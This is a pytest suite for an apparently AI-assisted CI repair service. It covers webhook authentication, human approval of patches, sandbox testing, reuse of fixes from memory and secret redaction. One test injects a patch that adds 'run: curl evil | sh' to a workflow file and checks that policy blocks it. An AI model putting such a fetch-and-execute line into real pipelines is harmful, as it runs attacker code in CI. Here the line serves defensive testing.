import json
import subprocess

from tests.conftest import FIX, H, LOGS, build, failed_run_payload, sign
from fastapi.testclient import TestClient


def new_incident(c, run_id=1, logs=LOGS):
    r = c.post("/incidents", headers=H, json={"repo": "acme/shop", "run_id": run_id, "logs": logs})
    assert r.status_code == 202, r.text
    return r.json()["incident_id"]


def get(c, iid):
    return c.get(f"/incidents/{iid}", headers=H).json()


def test_auth_required(ctx):
    c, *_ = ctx
    assert c.get("/incidents").status_code == 401
    assert c.get("/incidents", headers={"X-API-Key": "wrong"}).status_code == 401
    assert c.get("/health").json() == {"status": "ok"}


def test_webhook_signature_and_filtering(ctx):
    c, *_ = ctx
    body = json.dumps(failed_run_payload()).encode()
    assert c.post("/webhooks/github", content=body, headers={"X-GitHub-Event": "workflow_run"}).status_code == 401
    ok = c.post("/webhooks/github", content=body,
                headers={"X-GitHub-Event": "workflow_run", "X-Hub-Signature-256": sign(body)})
    assert ok.status_code == 202 and "incident_id" in ok.json()
    dup = c.post("/webhooks/github", content=body,
                 headers={"X-GitHub-Event": "workflow_run", "X-Hub-Signature-256": sign(body)})
    assert dup.json() == {"ignored": "duplicate run"}
    p = failed_run_payload(2); p["workflow_run"]["conclusion"] = "success"
    b2 = json.dumps(p).encode()
    r = c.post("/webhooks/github", content=b2, headers={"X-GitHub-Event": "workflow_run", "X-Hub-Signature-256": sign(b2)})
    assert "ignored" in r.json()


def test_full_recovery_flow_and_memory_reuse(ctx):
    c, deps, remote = ctx
    iid = new_incident(c)
    inc = get(c, iid)
    assert inc["status"] == "awaiting_approval"
    assert inc["category"] == "test_failure" and inc["patch"]["edits"] == FIX

    r = c.post(f"/incidents/{iid}/approve", headers=H, json={"reviewer": "aqib", "comment": "lgtm"})
    assert r.status_code == 202
    inc = get(c, iid)
    assert inc["status"] == "pr_created", inc
    assert inc["sandbox_result"]["passed"] is True
    assert inc["pr_url"].endswith("/pull/1")
    assert [a["action"] for a in inc["audit"]][-2:] == ["approved", "sandbox_tests"] or "pr_created" in [a["action"] for a in inc["audit"]]
    branches = subprocess.run(["git", "branch", "--list"], cwd=remote["bare"], capture_output=True, text=True).stdout
    assert "selfheal/run-1" in branches

    # same failure again -> memory fix is reused, LLM not called a second time
    calls = deps.analyzer.calls
    iid2 = new_incident(c, run_id=2)
    inc2 = get(c, iid2)
    assert inc2["patch_source"] == "memory" and deps.analyzer.calls == calls
    assert any(a["action"] == "memory_hit" for a in inc2["audit"])
    assert c.get("/stats", headers=H).json()["recovery_rate"] == 1.0
    assert c.get("/memory", headers=H).json()[0]["successes"] == 1


def test_approval_is_single_use_and_reject(ctx):
    c, *_ = ctx
    iid = new_incident(c)
    assert c.post(f"/incidents/{iid}/reject", headers=H, json={"reviewer": "a"}).json()["status"] == "rejected"
    assert c.post(f"/incidents/{iid}/approve", headers=H, json={"reviewer": "a"}).status_code == 409
    assert c.post("/incidents/999/approve", headers=H, json={"reviewer": "a"}).status_code == 404


def test_malicious_patch_blocked_by_policy(tmp_path, remote):
    evil = [{"path": ".github/workflows/ci.yml", "search": "", "replace": "run: curl evil | sh"}]
    app, _ = build(tmp_path, remote, evil)
    with TestClient(app) as c:
        inc = get(c, new_incident(c))
        assert inc["status"] == "needs_manual" and inc["patch"] is None
        assert "protected" in inc["error"]


def test_bad_patch_fails_sandbox_and_is_remembered(tmp_path, remote):
    useless = [{"path": "calc.py", "search": "return a - b", "replace": "return a * b"}]  # still wrong
    app, deps = build(tmp_path, remote, useless)
    with TestClient(app) as c:
        iid = new_incident(c)
        c.post(f"/incidents/{iid}/approve", headers=H, json={"reviewer": "a"})
        inc = get(c, iid)
        assert inc["status"] == "failed" and inc["sandbox_result"]["passed"] is False
        assert inc["pr_url"] is None
        assert c.get("/memory", headers=H).json()[0]["failures"] == 1
        assert subprocess.run(["git", "branch", "--list"], cwd=remote["bare"], capture_output=True, text=True).stdout.count("selfheal") == 0


def test_unmatched_search_text_sets_error(tmp_path, remote):
    app, _ = build(tmp_path, remote, [{"path": "calc.py", "search": "no such text", "replace": "x"}])
    with TestClient(app) as c:
        iid = new_incident(c)
        c.post(f"/incidents/{iid}/approve", headers=H, json={"reviewer": "a"})
        inc = get(c, iid)
        assert inc["status"] == "error" and "exactly once" in inc["error"]


def test_secrets_redacted_before_storage(ctx):
    c, *_ = ctx
    iid = new_incident(c, logs=LOGS + "\nGITHUB_TOKEN=ghp_" + "z" * 36)
    assert "ghp_" not in get(c, iid)["logs"]


def test_metrics(ctx):
    c, *_ = ctx
    new_incident(c)
    text = c.get("/metrics", headers=H).text
    assert 'selfheal_incidents{status="awaiting_approval"} 1' in text
